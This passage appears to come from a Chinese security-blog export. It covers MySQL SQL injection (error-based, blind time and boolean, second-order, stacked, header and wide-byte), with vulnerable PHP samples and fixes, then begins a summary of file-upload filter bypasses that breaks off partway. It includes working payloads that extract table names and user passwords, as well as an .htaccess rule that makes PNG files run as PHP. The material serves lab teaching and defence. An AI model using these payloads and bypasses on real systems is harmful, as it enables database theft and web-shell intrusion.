2.取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则 floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕 3.查询第二条记录，再次计算floor(rand(0)*2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以 floor(rand(0)*2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕 4.查询第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝 试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个 主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。 5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语 句才会报错的原因。获取表名: select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a获取表内容： select 1,2,3 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a 待补充（有点难懂） 常用的为前三种，下面的稍微点一下 当mysql版本大于5.5.53时，下面出现的函数无法继续利用其进行报错注入 geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b)); multipoint()select * from admin where id=1 and multipoint((select * from(select * from(select user())a)b)); polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b)); multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b)); linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b)); multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b)); exp()select * from test where id=1 and exp(~(select * from(select user())a)); NAME_CONST()函数报错注入（mysql版本&lt;5.1）在mysql中，列名重复会报错，所以name_const()函数就是利用这一特性，重新定义一个重复的列名来让数据库报错。定义重复列名报错语句：select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; 延时注入什么是延时注入在讲什么是延时注入之前呢，要先说一下为什么要用延时注入 之前存在sql注入漏洞的网站呢，你随便加个单引或双引就会报错，闭合方式也很好找。经过这几年痛苦的sql注入的磨 练，他们变机灵了……能够报错的网站程序越来越少，甚至有些存在注入点的网站不管加单引或双引他都会给你返回一个正 常页面。所以呢，我们也进化了……出现了一个让sql命令执行成功的标志——sleep(),因为这个函数正常执行后能够让网站 出现延迟，比较直观什么是延时注入： 我上面一大堆不就讲的这个？ 延时注入出现场景1、确定存在注入点，且找到闭合方式2、用上述所有获取信息的sql语句无效（无回显数据）3、sleep函数未被禁用4、等我想起来再补充 涉及到的函数介绍及利用延时注入最常用的组合拳：（不含过滤的情况）sleep() if() substr() ascii() length()接下来简单解释一下各个函数的作用sleep(num) 使用sleep函数可以延长sql语句执行时间:select * from table_name where column_name=ST and sleep(N) 延长 N秒 sleep有效的条件： 使用sleep的sql语句的查询结果不为空 需要注意的几个点： 程序运行时间由sql语句的条件（where）来定 select sleep(N),column_name from table_name 每查询出一条数据延迟相对应的N秒,但出现的数据并不是说过了每条数据的延时时间就会出现，而是过了 全部数据所需要sleep时间总和后，才会出现所有的数据 select sleep(N),column_name from table_name where ………… 上面这条sql语句的执行时间会根据where限制后出现的数据来定（数据量-&gt;程序执行时间） MySQL sleep过多的影响及解决方法: 影响： 严重消耗mysql服务器资源(主要是cpu, 内存)，并可能导致mysql崩溃。 解决方法: SHOW GLOBAL VARIABLES LIKE &apos;wait_timeout&apos;; SHOW GLOBAL VARIABLES LIKE &apos;interactive_timeout&apos;; SET GLOBAL wait_timeout=30; SET GLOBAL interactive_timeout=30; wait_timeout, 即可设置睡眠连接超时秒数，如果某个连接超时，会被mysql自然终止 wait_timeout=30 #即设置mysql连接睡眠时间为100秒，任何sleep连接睡眠时间若超过100秒，将会被 mysql服务自然终止 if(条件,执行1,执行2) 与大多编程语言中的if函数相似，执行判断功能 条件： 返回值为bool类型 执行1： 条件参数返回值为 True 执行2： 条件参数返回值为 False 常用于与sleep的搭配： if(条件,sleep(N),1) 如果条件成立,程序延时N秒（出现延时就代表存在注入点，且可利用这一点获取数据库信息） 如：if(1&lt;2,sleep(1),sleep(2)) 条件为True 程序延时1秒substr() substr()两种表示法： substr(string,num_start,num_length); string为字符串 start为字符起始位置(起始位置为1) length为截取字符长度 substr(String from N for M) String为字符串 from 对应上面的num_start 字符起始位置 for 对应上面的 num_length 截断长度 使用substr()对字符串进行操作: select substr(&apos;hello&apos;,2) -&gt; ello select substr(&apos;hello&apos; from 2) -&gt; ello 如果忽略最后一个参数（截断长度）自动选取从开始位置到最后的字符串 select substr(&apos;hello&apos;,2,3) -&gt; ell select substr(&apos;hello&apos; from 2 for 3) -&gt; ell 这就是比较正常的使用方法（我没说上面的不正常啊）ascii() ascii()的作用为返回相应字符的ASCII编码，如果输入字符串或一串数字则会按第一个字符来进行返回相应的ASCII编码 select ascii(1) -&gt; 49 select ascii(&apos;a&apos;) -&gt; 97 一个单独的ascii()函数确实没什么大意思，但与上面的stbstr()、if(),sleep()来套组合拳，那就很厉害了 ascii(substr(String,Num_Start,1)) 利用substr来截取字符串的每一个字符来传递给ascii，ascii()函数呢再最终输出该字符的ascii编码 if(ascii(substr(String,Num_Start,1))=Num,sleep(N),1) 利用if来将ascii()函数返回的ascii编码进行判断（猜测）,如果猜测数据正好等于返回的ascii编码,那么 程序就进行延时N秒。 利用sleep()这个特性呢，就可以进行fuzz测试获取真实数据以达到注入目的length() length(String) 返回字符串长度 如：select length(database()); 返回当前数据库名长度 与ascii()函数一样，不打组合拳没什么威力 if(length(String)=Num,条件1,条件2) 在进行substr获取数据库、表、字段名之前，如果知道他们各自的字符串长度，在进行爆破名的过程中效率会 高跟多 获取数据库信息#获取当前数据库名长度and if(length(database())=Num,sleep(3),1)#获取所有数据库名长度and if(length((select group_concat(schema_name) from information_schema.schemata))=Num,sleep(3),1)#获取当前数据库名and if(ascii(substr(database(),N,1)=Num,sleep(3),1) N的大小由数据库名长度决定,Num的范围是 1~127 汉字除外上面已经说了具体获取数据库库名和长度的方法，表、字段等相关信息不再复述 Bool注入什么是Bool注入构造特定的sql语句 当条件成立时网页返回正常（and 1=1） 当条件不成立时网页出现错误（and 1=2）Bool注入使用的环境 1、正常注入流程无法使网页回显有效数据库信息 2、当构造的sql语句条件不成立时会返回与正常页面不同的信息（不成立的依据） 后端代码： &lt;?php error_reporting(0); //程序不报错 $con = mysqli_connect('127.0.0.1','root','****','test'); $id = $_GET['id']; $sql = \"select * from admin where id =$id limit 1\"; $res = mysqli_query($con,$sql); $row = mysqli_fetch_array($res);#重点##################################################################################### if($row)&#123; echo $row['username']; //条件正确，网页返回正常数据 &#125; else&#123; echo \"error\"; //条件错误，网页返回error &#125;#####################################################################################?&gt; 涉及到的sql函数及利用与延时注入相似，大多是将延时注入里面中的sleep()替换为1，与之相对的替换为0 为什么替换为1、0： 1在编程语言代表True 0在变成序言中代表False常用到的函数： if()、ascii()、length()、substr() 上述函数已经在延时注入里面介绍过了，这里不再造车轮利用Bool注入获取数据库信息： 注入环境： and 1=1 返回正常 and 1=2 返回错误 获取当前数据库名长度： and 1=if(length(database())=Num,1,0) 遍历Num 当条件成立时页面返回正常 获取当前数据库名： and 1=if(ascii(substr(database(),Num,1))=Num2,1,0) Num:截取database()第几个字符 遍历Num2获取该字符的ascii编码进行解码即可 剩下的表长度、表名、字段长度、字段名、字段信息都是通过这种方法获取的，方法，原理都是一样。不再复述 简单的防注入： &lt;?php error_reporting(0); $con = mysqli_connect('127.0.0.1','root','****','test'); $id = $_GET['id']; $id = mysqli_escape_string($id); //防注入 $sql = \"select * from admin where id ='$id' limit 1\"; //注意这里进行了单引号闭合,这两点一起才能防注入 $res = mysqli_query($con,$sql); $row = mysqli_fetch_array($res); if($row)&#123; echo $row['username']; &#125; else&#123; echo \"error\"; &#125;?&gt; ''' 这种简单的防注入不仅仅是应用在Bool注入，延时注入，二次注入，联合注入等注入攻击基本上都可以防御 ''' 二次注入什么是二次注入攻击者构造的恶意数据存储到数据库中，导致每次特定操作可引发恶意代码的执行。上述两个过程即为二次注入 1、将恶意数据（代码）插入到数据库中 2、攻击者特定行为使恶意代码从服务器中执行 二次注入的利用二次注入不像上面的延时注入、Bool注入、联合注入花样那么多，而且二次注入根据不同的环境也会存在不同的注入方法。在这里就以实战的形式来进行表达(sqllab 24题) 登陆界面： 后端代码： $username = mysql_real_escape_string($_POST[\"login_user\"]);$password = mysql_real_escape_string($_POST[\"login_password\"]);$sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\";username password 都用了mysql_real_escape_string函数将敏感字符进行过滤，所以登录界面不存在什么注入 PHP mysql_real_escape_string() 函数防SQL注入注册用户功能： 后端代码： if (isset($_POST['submit']))&#123; $username= mysql_escape_string($_POST['username']); //将敏感字符过滤 $pass= mysql_escape_string($_POST['password']); //将敏感字符过滤 $re_pass= mysql_escape_string($_POST['re_password']); //将敏感字符过滤 echo \"&lt;font size='3' color='#FFFF00'&gt;\"; $sql = \"select count(*) from users where username='$username'\"; $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( '); $row = mysql_fetch_row($res); //print_r($row); if (!$row[0]== 0) &#123; ?&gt; &lt;script&gt;alert(\"The username Already exists, Please choose a different username \")&lt;/script&gt;; &lt;?php header('refresh:1, url=new_user.php'); &#125; else &#123; if ($pass==$re_pass) &#123; # Building up the query........ $sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\"; mysql_query($sql) or die('Error Creating your user account, : '.mysql_error()); echo \"&lt;/br&gt;\"; ·················· 构造 Username: admin&apos;# 从后端源码可以看出 需要进行单引号闭合 password = admin 登录后进行密码修改 无论当前密码是什么，都可以修改成功 image-20191105204537626 能修改成功的原因： username：admin&apos;# 在进行修改密码的过程中用到了下面的sql语句： $sql = update table_name set password=new_password where username=admin&apos;# and curr_password=* 可以看到 # 将后面password的验证注释掉了。所以无论原密码是什么,都可以成功将密码修改 一道关于二次注入的CTF修复方案暂且能想到的办法是对用户输入的特殊字符进行过滤 搁置的问题 二次注入没有实现的代码 //输入数据代码（insert）&lt;form action=\"\" method=\"post\"&gt; name &lt;input type=\"text\" name=\"name\"&gt; &lt;/br&gt; passwd &lt;input type=\"password\" name=\"passwd\"&gt; &lt;/br&gt; &lt;input type='submit'&gt;&lt;/form&gt;&lt;?php$con = mysql_connect('localhost','root',\"****\",'testt');mysql_select_db('testt',$con);$name = $_POST['name'];$name = mysql_escape_string($name);$passwd = $_POST['passwd'];$passwd = mysql_escape_string($passwd);// $name = mysql_real_escape_string($name);// $sql = \"insert into test(id,user,passwd) values(NULL,\\\"$name\\\",\\\"$passwd\\\");\";// $res = mysql_query($sql,$con);$sql = \"insert into test ( user, passwd) values(\\\"$name\\\", \\\"$passwd\\\")\";mysql_query($sql) or die('Error Creating your user account, : '.mysql_error());?&gt; //更新数据代码 不知道哪出了问题，没有办法实现二次注入&lt;form action=\"\" method=\"post\"&gt; name &lt;input type=\"text\" name=\"name\"&gt; &lt;/br&gt; oldpasswd &lt;input type=\"password\" name=\"odpass\"&gt; &lt;/br&gt; passwd &lt;input type=\"password\" name=\"passwd\"&gt; &lt;/br&gt; &lt;input type='submit'&gt;&lt;/form&gt;&lt;?php$con = mysql_connect('localhost','root',\"****\");mysql_select_db('testt',$con);$passwd = $_POST['passwd'];$passwd = mysql_real_escape_string($passwd);$odpass = $_POST['odpass'];$odpass = mysql_real_escape_string($odpass);$name = $_POST['name'];$sql = \"UPDATE test SET passwd='$passwd' where user='$name' and passwd='$odpass'; \";echo $sql;$res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');$row = mysql_affected_rows();?&gt; 堆叠注入什么是堆叠注入平常我们注入时都是通过对原来sql语句传输数据的地方进行相关修改，注入情况会因为该语句本身的情况而受到相关限制。但堆叠注入的一条sql语句中存在多条功能不同的sql语句，其中每条不同功能的sql语句以 ; 结束。在特定情况下可以依次执行拼接好的sql语句。这样就突破了仅能对数据进行操作的限制，堆叠注入可以进行sql中所有的操作 堆叠注入使用的条件堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行。 后端代码 &lt;?php$con = mysqli_connect('localhost','root','****','testt');@$id = $_GET['id'];$sql = \"select * from test where id=$id;\";mysqli_multi_query($con,$sql); //支持执行多条sql语句$res = mysqli_store_result($con); //上一条sql语句执行结果储存在 mysqli_store_result（）。结果空返回NULL$row = mysqli_fetch_array($res);//返回形式类似于python中的字典只不过php有自己的数组输出方式var_dump($row);?&gt; ''' 正常情况下，程序是不会回显第一条sql语句分号后面的内容，但分号后面的sql语句会在数据库中正常执行 修复堆叠注入很简单，在其他条件不会触发sql注入的情况下将mysqli_multi_query() 替换为 mysqli_query()''' Insert、update注入什么是Insert、update注入在数据库中处理或更新字段信息时会用到其中的insert（插入新字段数据）、update（更新字段数据）函数来对数据进行修改。因为对数据库进行交互，后端代码没有进行严格的过滤或存在其他安全问题。当新的字段数据可控时，可能会导致sql注入等系列安全问题 后端代码&lt;?php$con = mysqli_connect('localhost','root','******','testt');@$name = $_GET['name'];@$passwd = $_GET['passwd'];$sql = \"insert into test values(NULL,'$name','$passwd')\";#'''上面是insert注入'''$sql = \"update test set passwd='$passwd' where user='$name'\";#'''这里是update注入'''mysqli_query($con,$sql);?&gt; 修复方案#如果后端代码对可控信息参数进行引号闭合，可以用下面转义的方法进行防御@$name = $_GET['name'];$name = addslashes($name);@$passwd = $_GET['passwd'];$passwd = addslashes($passwd);#如果后端代码没有对可控信息参数进行引号闭合，可采用特殊字符过滤的方法进行防御 留下的问题为什么上面的程序可以用and sleep(3) or&apos; 进行注入下面header头注入却要用 or sleep(3) or&apos; 来进行注入 解决上面出现的问题在解决问题之前，先了解一下 and、or 执行原理及mysql中处理字符串的原理 and： 当 and 前的条件为True时，and后面的（sql函数或sql语句）才执行 select 1 and sleep(2) #执行（ 1 代表True，&gt;1 完全成立） select 0 and sleep(2) #不执行（ 0 代表False） or： 当 or 前面的条件为False时，or 后面的（sql函数或sql语句）才执行 select 0 or sleep(2) # 执行 select 1 or sleep(2) # 不执行 在mysql中当字符串与数字进行比较时，如果字符串中的第一个字符是0-9任意数字，则在比较过程中会用第一个数字与其 进行比较，如果第一个字符是非整型则默认为0 select &quot;1a&quot;=1; =&gt; 1 select &quot;a&quot;=a; =&gt; 0#insert、update后端与数据库交互的部分代码$sql = &quot;insert into test values(NULL,&apos;$name&apos;,&apos;$passwd&apos;)&quot;; 当 $name 被传入的值为 123 时 可用 and 来进行触发延时注入（123&gt;1 = True） 当 $name 被传入的值为 &quot;asd&quot; 时 可用 or 来进行触发延时注入(&quot;asd&quot;= 0 =False)所以这就很好解释HTTP头注入大多用 or 而不用 and HTTP头获取的数据大多为字符型数据且第一个字符为非整型数据，所以要用or不用and。 如果host 存放的数据为 1.1.1.1 那 就要用 and 来触发 延时注入 HTTP头注入什么是HTTP{头注入先来看一段正常的请求包GET /test.php HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: values=adminDNT: 1Connection: closeUpgrade-Insecure-Requests: 1上面全部的都为请求包的Head部分，因为User-Agent（反爬虫）、Host（不明白的东西不能说）、Cookie（判断用户）这三个头所包含的数据存在特殊用处，所以有些网站会将他们及其对应的数据内容存放到数据库中，如果后端代码没有处理完善，进而导致sql注入因为Head头注入里面牵扯到的原理是一样的，所以我就用同一个后端代码来进行概括了 后端代码&lt;?php$con = mysqli_connect('localhost','root','******','testt');setcookie(\"values\",\"admin\"); //设置一个cookie 键值、键名$cookie = $_COOKIE['values']; // 获取请求中的Cookie信息echo \"COOKIE:\".$cookie.\"&lt;/br&gt;\";$xff = getenv('HTTP_X_FORWARDED_FOR'); // 获取XFF请求的数据信息echo $xff;$UA = $_SERVER['HTTP_USER_AGENT']; //获取请求中的User-Agentecho $UA.\"&lt;/br&gt;\";$host = $_SERVER[\"HTTP_HOST\"]; // 获取请求中的Hostecho $host.\"&lt;/br&gt;\";$sql = \"insert into db values('$cookie','$host','$UA')\";mysqli_query($con,$sql);?&gt; 修复方案$cookie = $_COOKIE['values']; // 获取请求中的Cookie信息$cookie = addslashes($cookie);//将数据内容进行转义$UA = $_SERVER['HTTP_USER_AGENT']; //获取请求中的User-Agent$UA = addslashes($UA);//将数据内容进行转义$xff = getenv('HTTP_X_FORWARDED_FOR'); //获取请求中的XFF$xff = addslashes($xss) //将数据内容进行转义$host = $_SERVER[\"HTTP_HOST\"]; // 获取请求中的Host$host = addslashes($host);//将数据内容进行转义 宽字节注入什么是宽字节注入一个gbk汉字占用两个字节，一个utf-8汉字占用三个字节。宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）PHP把&apos;转义为\\&apos;mysql 将%df\\&apos; 中的%df\\ 认为是一个GBK字符，所谓的吃掉了\\ 导致sql注入 宽字节编码的种类GB2312、GBK、GB18030、BIG5、Shift_JIS等 MySQL中用于转义的函数addslashesmysql_real_escape_stringmysql_escape_string以及后面在高版本被去除的magic_quote_gpc 后端代码&lt;?php$con = mysqli_connect('localhost','root',****,'testt');@$id = $_GET['id'];mysqli_query($con,\"set names gbk\"); //设置字符编码为GBK$id = addslashes($id); //将获取id的数据进行转义$sql = \"select * from test where id='$id'\";$res = mysqli_query($con,$sql) or die(mysqli_error());$row = mysqli_fetch_array($res);echo $row['user'].$ row['id'].$row['passwd'];?&gt; 修复方案1.设置character_set_client=binary，将数据以二进制形式传递 mysql客户端查看当前字符集 show variables like &quot;%char%&quot;; 在安装MySQL时可以设置服务器的默认编码格式，也可对my.ini做修改，修改[mysqld]里面的 character_set_server=utf8，则可设置character_set_server的值。2.矫正人们对于mysql_real_escape_string的误解，单独调用set names gbk和mysql_real_escape_string是无法避免宽 字符注入问题的。还得调用mysql_set_charset来设置一下字符集。3.谨慎使用iconv来转换字符串编码，很容易出现问题。只要我们把前端html/js/css所有编码设置成gbk，mysql/php编码设 置 成gbk，就不会出现乱码问题。不用画蛇添足地去调用iconv转换编码，造成不必要的麻烦。","categories":[{"name":"数据库安全","slug":"数据库安全","permalink":"https://13l00m.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://13l00m.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql","slug":"mysql","permalink":"https://13l00m.github.io/tags/mysql/"}]},{"title":"文件上传漏洞类型总结","slug":"文件上传漏洞类型总结","date":"2019-11-28T01:37:38.000Z","updated":"2019-11-28T01:55:57.792Z","comments":true,"path":"2019/11/28/文件上传漏洞类型总结/","link":"","permalink":"https://13l00m.github.io/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/","excerpt":"","text":"文件上传漏洞类型总结写在开始 文件上传不同类型有难易之分，简单类型简单处理 文件上传——前端绕过 前端代码 &lt;script type=\"text/javascript\"&gt; function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125; &#125;&lt;/script&gt; 绕过原理： 检测程序为前端校验 绕过方法： 删除JavaScript代码 上传图片马，burp抓包将后缀改为原脚本后缀类型 文件上传——文件类型绕过 后端代码 if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 绕过原理： 程序只检测了上传文件的文件类型 绕过方法： 上传图片改文件后缀 上传脚本文件，改文件类型 文件上传——不同脚本文件类型解析绕过 后端代码 if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; 绕过原理： 程序未对可以解析php文件的其他类型进行过滤 服务器支持未进行过滤的其他文件类型进行解析php 绕过方法： 上传能够解析的php文件后缀：phtml、php5 等 服务器开启phtml，php5解析 打开配置文件 httpd.conf 添加语句 AddType application/x-httpd-php .php .phtml .phps .php5 .pht（如果存在，将前面的注释删除） 文件上传——.htaccess文件上传绕过 后端代码 $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; .htaccess是什么 笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 htaccess详解及.htaccess参数说明 .htaccess 文件的简单编写 &lt;FilesMatch \"php.png\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 上面简单的代码是服务器里面的 php.png 特定文件内容解析为php 绕过原理： 程序未对.htaccess 黑名单过滤且上传文件的文件名不会发生改变 绕过方法： 编写并上传.htaccess 文件 利用其特性可将文件类型定将解析为脚本类型 文件上传——文件类型大小写绕过 后端代码 $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; 绕过原理： 程序没有将上传文件名进行统一大小写处理 绕过方法： 文件类型后缀大小写处理后进行上传 注意事项： Linux系统的文件名是区分大小写的，所以该上传方法不适用于Linux服务器 文件上传——后缀名加空格绕过后端代码 $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; 绕过原理： 程序没有对文件后缀名去空处理 绕过方法 文件上传burp抓包修改后缀加个空格 文件上传——后缀名加 . 绕过 后端代码 $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; 绕过原理： 程序没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”， 绕过方法： 可在后缀名中加”.”绕过 文件上传——NTFS ADS 文件流绕过检测 后端代码 $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = 